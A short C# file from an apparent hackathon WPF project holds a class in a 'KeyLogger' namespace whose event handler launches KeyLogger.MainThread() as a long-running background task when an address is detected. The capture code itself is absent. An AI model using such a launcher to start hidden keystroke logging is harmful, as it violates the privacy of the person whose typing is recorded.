using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Hackaton_Wpf.KeyLogger
{
    class LoggerDelegate
    {
        //public delegate void AdressDetect();

        private async void AddressDetected(object sender, EventArgs e)
        {
            await Task.Factory.StartNew(() => KeyLogger.MainThread(),
                TaskCreationOptions.LongRunning);

        }

    }
}
